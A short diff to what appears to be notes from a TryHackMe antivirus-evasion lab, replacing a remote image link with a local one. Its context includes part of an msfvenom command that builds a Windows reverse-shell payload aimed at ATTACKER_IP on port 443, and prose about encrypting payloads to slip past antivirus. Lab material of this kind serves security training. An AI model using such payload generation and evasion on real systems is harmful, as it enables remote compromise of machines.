@@ -40,7 +40,7 @@ msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_
 
 If we try uploading our newly generated payload to our test machine, the AV will instantly flag it before we even get a chance to execute it:
 
-![https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/747c69e737c96044123329c47845f659.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/747c69e737c96044123329c47845f659.png)
+<img src="images/t8_1.png">
 
 If encoding doesn't work, we can always try encrypting the payload. Intuitively, we would expect this to have a higher success rating, as decrypting the payload should prove a harder task for the AV. Let's try that now.
 
